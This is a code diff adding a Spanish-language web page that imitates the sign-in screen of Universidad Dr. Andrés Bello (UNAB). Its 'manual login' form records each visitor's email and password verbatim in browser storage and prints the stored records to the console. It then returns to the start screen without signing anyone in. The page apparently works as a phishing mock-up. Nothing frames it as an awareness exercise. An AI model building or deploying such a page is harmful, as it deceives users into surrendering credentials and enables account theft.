@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universidad Dr. Andrés Bello - Iniciar Sesión</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Google Sans", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #1a3a5c;
+            background-image: url("FONDOUNAB.jpg");
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.23);
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-card {
+            width: 100%;
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 38px 40px 30px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.25);
+            text-align: center;
+        }
+
+        /* LOGO */
+        .logo {
+            display: block;
+            width: 225px;
+            max-width: 100%;
+            height: auto;
+            margin: 0 auto 25px;
+        }
+
+        .logo img {
+            width: 100%;
+            display: block;
+        }
+
+        /* BOTON UNAB */
+        .btn-unab {
+            width: 100%;
+            height: 49px;
+            border: none;
+            border-radius: 7px;
+            background: linear-gradient(90deg, #263f5d 0%, #245f4a 100%);
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.18);
+            transition: all 0.3s ease;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .btn-unab:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.22);
+        }
+
+        .btn-unab:active {
+            transform: scale(0.98);
+        }
+
+        .google-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .google-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* TEXTO MANUAL */
+        .manual-text {
+            margin-top: 23px;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .manual-text a {
+            color: #315fd4;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .manual-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* FORMULARIO */
+        .form-container {
+            display: none;
+            margin-top: 0;
+            text-align: left;
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: border 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #1a3a5c;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(26, 58, 92, 0.15);
+        }
+
+        /* BOTON PRINCIPAL */
+        .btn-primary {
+            width: 100%;
+            height: 49px;
+            border: none;
+            border-radius: 7px;
+            background: linear-gradient(90deg, #263f5d 0%, #245f4a 100%);
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.18);
+            transition: all 0.3s ease;
+            margin-top: 6px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.22);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        /* MENSAJES */
+        .message {
+            font-size: 14px;
+            padding: 6px 0;
+            min-height: 24px;
+            color: #d32f2f;
+        }
+
+        .message.success {
+            color: #2e7d32;
+        }
+
+        /* ENLACES */
+        .switch-link {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+        }
+
+        .switch-link a {
+            color: #315fd4;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .switch-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* IDIOMA */
+        .language {
+            margin-top: 33px;
+        }
+
+        .language button {
+            border: none;
+            background: rgba(55, 67, 91, 0.90);
+            color: #ffffff;
+            padding: 9px 17px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+            transition: background 0.2s ease;
+        }
+
+        .language button:hover {
+            background: rgba(42, 53, 75, 0.95);
+        }
+    </style>
+</head>
+
+<body>
+<div class="container">
+    <div class="login-card">
+
+        <!-- LOGO -->
+        <div class="logo">
+            <img src="LOGOUNAB.png" alt="Universidad Dr. Andrés Bello">
+        </div>
+
+        <!-- VISTA PRINCIPAL -->
+        <div id="mainView">
+            <button class="btn-unab" id="btnUnab" type="button">
+                <span class="google-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="11" fill="white" stroke="#e0e0e0" stroke-width="0.5"/>
+                        <path d="M16.6 11.2c0-.8-.1-1.6-.2-2.4H12.2v4.6h5.8c-.3 1.5-1.2 2.8-2.5 3.6v3h4c2.4-2.2 3.8-5.4 3.8-8.8z" fill="#4285F4"/>
+                        <path d="M12.2 21.7c3.4 0 6.3-1.1 8.3-3l-4-3c-1.2.8-2.7 1.2-4.3 1.2-3.3 0-6.1-2.2-7.1-5.2H1.7v3.1c2 4 6.1 6.9 10.5 6.9z" fill="#34A853"/>
+                        <path d="M5.1 13.7c-.2-.7-.4-1.4-.4-2.2s.2-1.5.4-2.2V6.2H1.7C1.2 7.3 1 8.6 1 10.1s.2 2.8.7 3.9l3.4-2.3z" fill="#FBBC05"/>
+                        <path d="M12.2 3.5c1.8 0 3.5.6 4.8 1.8l3.6-3.6C18.5.6 15.6 0 12.2 0 7.8 0 3.7 2.9 1.7 6.9l3.4 2.3c1-2.9 3.8-5.2 7.1-5.2z" fill="#EA4335"/>
+                    </svg>
+                </span>
+                <span>Ingresar con cuenta UNAB</span>
+            </button>
+
+            <div class="manual-text">
+                ¿O no tienes cuenta UNAB?
+                <a id="showManualLogin">Inicia sesión manualmente aquí</a>
+            </div>
+        </div>
+
+        <!-- LOGIN MANUAL -->
+        <div id="manualLoginView" class="form-container">
+            <form id="formLogin" autocomplete="off">
+                <div class="form-group">
+                    <label for="loginEmail">Correo electrónico</label>
+                    <input type="email" id="loginEmail"
+                           placeholder="correo@ejemplo.com"
+                           autocomplete="off" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="loginPassword">Contraseña</label>
+                    <input type="password" id="loginPassword"
+                           placeholder="Contraseña"
+                           autocomplete="new-password" required>
+                </div>
+
+                <div id="loginMessage" class="message"></div>
+
+                <button type="submit" class="btn-primary">Iniciar sesión</button>
+            </form>
+
+            <div class="switch-link">
+                <a id="backToMainFromLogin">← Volver</a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- IDIOMA -->
+    <div class="language">
+        <button type="button">Español - Internacional (es)</button>
+    </div>
+</div>
+
+<script>
+(function () {
+    /* =========================================================
+       REPOSITORIO LOCAL
+       ========================================================= */
+    const STORAGE_KEY = "unab_registros";
+
+    /* Elementos */
+    const mainView            = document.getElementById("mainView");
+    const manualLoginView     = document.getElementById("manualLoginView");
+    const showManualLoginLink = document.getElementById("showManualLogin");
+    const backToMainFromLogin = document.getElementById("backToMainFromLogin");
+    const formLogin           = document.getElementById("formLogin");
+    const loginEmail          = document.getElementById("loginEmail");
+    const loginPassword       = document.getElementById("loginPassword");
+    const loginMessage        = document.getElementById("loginMessage");
+
+    /* =========================================================
+       REPOSITORIO
+       ========================================================= */
+    function obtenerRegistros() {
+        try {
+            const datos = localStorage.getItem(STORAGE_KEY);
+            return datos ? JSON.parse(datos) : [];
+        } catch (error) {
+            console.error("Error leyendo LocalStorage:", error);
+            return [];
+        }
+    }
+
+    function guardarRegistro(correo, password) {
+        const registros = obtenerRegistros();
+
+        const nuevoRegistro = {
+            id: Date.now(),
+            correo: correo,
+            password: password,
+            fecha: new Date().toLocaleString("es-SV"),
+            evento: "Inicio de sesión manual"
+        };
+
+        registros.push(nuevoRegistro);
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(registros));
+
+        return nuevoRegistro;
+    }
+
+    /* =========================================================
+       VISTAS
+       ========================================================= */
+    function mostrarPrincipal() {
+        mainView.style.display = "block";
+        manualLoginView.classList.remove("active");
+        loginMessage.textContent = "";
+        loginMessage.className = "message";
+        loginEmail.value = "";
+        loginPassword.value = "";
+    }
+
+    function mostrarLoginManual() {
+        mainView.style.display = "none";
+        manualLoginView.classList.add("active");
+        loginMessage.textContent = "";
+        loginMessage.className = "message";
+        loginEmail.focus();
+    }
+
+    /* =========================================================
+       ENLACES
+       ========================================================= */
+    showManualLoginLink.addEventListener("click", function (event) {
+        event.preventDefault();
+        mostrarLoginManual();
+    });
+
+    backToMainFromLogin.addEventListener("click", function (event) {
+        event.preventDefault();
+        mostrarPrincipal();
+    });
+
+    /* =========================================================
+       FORMULARIO
+       ========================================================= */
+    formLogin.addEventListener("submit", function (event) {
+        event.preventDefault();
+
+        const correo   = loginEmail.value.trim();
+        const password = loginPassword.value;
+
+        if (!correo || !password) {
+            loginMessage.textContent = "Completa todos los campos.";
+            loginMessage.className = "message";
+            return;
+        }
+
+        // Guardamos correo Y contraseña tal cual los escribió el usuario
+        guardarRegistro(correo, password);
+
+        // Volvemos a la pantalla inicial
+        mostrarPrincipal();
+    });
+
+    /* =========================================================
+       INICIO
+       ========================================================= */
+    mostrarPrincipal();
+
+    console.log("Clave de almacenamiento:", STORAGE_KEY);
+    console.log("Registros actuales:", obtenerRegistros());
+})();
+</script>
+</body>
+</html>
